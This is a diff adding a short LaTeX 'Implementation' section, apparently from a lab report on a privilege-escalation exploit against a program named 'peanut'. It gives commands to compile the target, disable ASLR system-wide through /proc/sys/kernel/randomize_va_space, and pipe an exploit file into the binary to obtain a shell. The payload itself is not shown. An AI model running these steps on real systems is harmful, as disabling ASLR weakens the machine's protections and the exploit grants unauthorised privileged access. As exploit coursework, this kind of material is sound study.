@@ -1,0 +1,8 @@
+\section{Implementation}
+\label{sec:implementation}
+The following steps must be followed to get the privilege escalation:
+\begin{enumerate}
+\item Start by compiling the code with the following command: {\tt gcc -o peanut peanut.c}
+\item Disable ASLR with the commane {\tt echo 0 | tee /proc/sys/kernel/randomize_va_space}
+\item The exploit is printed in the {\tt exploit} file. Just run {\tt (cat exploit; cat) | ./peanut} to run bin/shh
+\end{enumerate}
